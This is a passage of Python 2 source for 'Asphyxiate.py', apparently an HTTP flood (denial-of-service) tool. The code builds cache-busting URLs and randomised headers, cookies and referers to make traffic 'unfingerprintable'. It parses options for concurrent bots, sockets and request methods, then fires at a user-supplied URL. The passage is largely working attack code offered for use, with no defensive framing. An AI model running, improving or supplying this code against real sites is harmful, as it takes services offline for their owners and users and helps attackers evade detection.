        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)

        http_headers = self.generateRandomHeaders()


        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner = '?'):

        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))

    def generateRandomHeaders(self):

        # Random no cache entries I guess it helps but dunno
        noCacheDirectives = ['no-cache', 'must-revalidate']
        random.shuffle(noCacheDirectives)
        noCache = ', '.join(noCacheDirectives)

        # Random accept encoding :P
        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(0,len(acceptEncoding)/2)
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': random.choice(self.useragents),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(110,120),
            'Host': self.host,
        }
    
        # Randomly-added headers
        # These headers are optional and are 
        # randomly sent thus making the
        # header count random and unfingerprintable
		# So dont edit our you fucked up the tool 
		# Please and thanks ~S0u1
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))

        if random.randrange(2) == 0:
            # Random Referer to site for options ubove dont edit took me almost years
            http_headers['Referer'] = random.choice(self.referers) + self.buildblock(random.randint(5,10))

        if random.randrange(2) == 0:
            
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie send "Idea by Animu"
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))

        return http_headers

    # Housekeeping x'D lulz
    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()

    # Real life counter :) 
    def incCounter(self):
        try:
            self.counter[0] += 1
        except (Exception):
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except (Exception):
            pass
        




# Other Functions for pazzaz 

def usage():
    print
    print '-----------------------------------------------------------------------------------------------------------'
    print ' USAGE: ./Asphyxiate.py <url> [OPTIONS]'
    print
    print ' OPTIONS:'
    print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
    print '\t -b, --bots\t\tNumber of concurrent Bots\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
    print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
    print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
    print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
    print '\t -h, --help\t\tShows this help'
    print '-----------------------------------------------------------------------------------------------------------'

    
def error(msg):
    # prints help information and exit:
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)


# This is the main part took forever


def main():
    
    try:

        if len(sys.argv) < 2:
            error('Please supply at least the URL')

        url = sys.argv[1]

        if url == '-h':
            usage()
            sys.exit()

        if url[0:4].lower() != 'http':
            error("Invalid URL supplied")

        if url == None:
            error("No URL supplied")

        opts, args = getopt.getopt(sys.argv[2:], "dhb:s:m:", ["debug", "help", "bots", "sockets", "method" ])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-b", "--bots"):
                workers = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '"+o+"' doesn't exists")

        asphyxiate = Asphyxiate(url)
        asphyxiate.nr_workers = workers
        asphyxiate.method = method
        asphyxiate.nr_sockets = socks

        asphyxiate.fire()

    except getopt.GetoptError, err:

        # print help information and exit:
        sys.stderr.write(str(err))
        usage()
        sys.exit(2)

if __name__ == "__main__":
    main()
